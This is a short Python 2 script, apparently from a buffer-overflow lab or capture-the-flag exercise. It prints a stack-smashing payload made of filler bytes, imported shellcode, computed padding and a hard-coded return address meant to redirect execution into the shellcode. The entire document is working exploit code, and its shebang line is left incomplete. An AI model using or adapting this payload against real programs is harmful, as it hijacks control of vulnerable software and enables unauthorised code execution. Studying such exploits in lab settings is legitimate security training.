#!/usr/bin/env
from shellcode import shellcode

print "x"*300+shellcode+"x"*(0xbffe8668-0xbffe8260+4-300-len(shellcode))+"\x40\x83\xfe\xbf"

